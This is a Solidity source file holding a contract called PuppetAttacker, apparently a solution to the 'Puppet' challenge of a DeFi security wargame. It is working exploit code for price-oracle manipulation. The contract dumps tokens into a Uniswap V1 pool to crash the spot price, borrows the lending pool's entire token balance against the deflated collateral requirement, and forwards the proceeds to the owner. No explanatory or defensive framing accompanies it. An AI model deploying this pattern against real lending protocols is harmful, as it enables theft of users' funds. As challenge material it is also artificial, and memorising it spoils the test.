// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import '@openzeppelin/contracts/utils/Address.sol';
import './PuppetPool.sol';

// https://docs.uniswap.org/protocol/V1/reference/interfaces
interface IUniswapV1 {
    // Get Prices
    function getEthToTokenInputPrice(uint256 eth_sold)
        external
        view
        returns (uint256 tokens_bought);

    function getEthToTokenOutputPrice(uint256 tokens_bought)
        external
        view
        returns (uint256 eth_sold);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        view
        returns (uint256 eth_bought);

    function getTokenToEthOutputPrice(uint256 eth_bought)
        external
        view
        returns (uint256 tokens_sold);

    // Trade ETH to ERC20
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline)
        external
        payable
        returns (uint256 tokens_bought);

    function ethToTokenTransferInput(
        uint256 min_tokens,
        uint256 deadline,
        address recipient
    ) external payable returns (uint256 tokens_bought);

    function ethToTokenSwapOutput(uint256 tokens_bought, uint256 deadline)
        external
        payable
        returns (uint256 eth_sold);

    function ethToTokenTransferOutput(
        uint256 tokens_bought,
        uint256 deadline,
        address recipient
    ) external payable returns (uint256 eth_sold);

    // Trade ERC20 to ETH
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);

    function tokenToEthTransferInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline,
        address recipient
    ) external returns (uint256 eth_bought);

    function tokenToEthSwapOutput(
        uint256 eth_bought,
        uint256 max_tokens,
        uint256 deadline
    ) external returns (uint256 tokens_sold);

    function tokenToEthTransferOutput(
        uint256 eth_bought,
        uint256 max_tokens,
        uint256 deadline,
        address recipient
    ) external returns (uint256 tokens_sold);
}

/**
 * @title PuppetAttacker
 * @author jb
 */
contract PuppetAttacker {
    using Address for address payable;

    address payable private _owner;

    uint256 _lock = 1;
    modifier nonreentrant() {
        require(_lock == 1, 'reentrancy');
        _lock = 2;
        _;
        _lock = 1;
    }

    constructor() {
        _owner = payable(msg.sender);
    }

    function attack(
        PuppetPool target,
        IUniswapV1 pool,
        address token,
        uint256 amount
    ) external payable nonreentrant {
        _attack(target, pool, token, amount, msg.sender);
    }

    /// @dev poor MEV protection
    function _attack(
        PuppetPool target,
        IUniswapV1 pool,
        address token,
        uint256 amount,
        address user
    ) internal {
        IERC20 erc20 = IERC20(token);

        // transfer in from caller
        erc20.transferFrom(user, address(this), amount);

        // unbalance uniswap pool
        erc20.approve(address(pool), amount);
        pool.tokenToEthSwapInput(
            amount,
            pool.getTokenToEthInputPrice(amount),
            block.timestamp
        );

        // get the reward
        uint256 reward = erc20.balanceOf(address(target));
        uint256 price = target.calculateDepositRequired(reward);
        require(price <= address(this).balance, 'too poor');
        target.borrow{value: price}(reward);

        // send reward
        erc20.transfer(_owner, erc20.balanceOf(address(this)));
        _owner.sendValue(address(this).balance);
    }

    // function _swap(
    //     IUniswapV1 pool,
    //     address token,
    //     uint256 amount
    // ) internal {
    //     uint256 amountOut = pool.getTokenToEthInputPrice(amount);
    //     pool.tokenToEthSwapInput(amount, amountOut, block.timestamp);
    // }

    receive() external payable {}
}
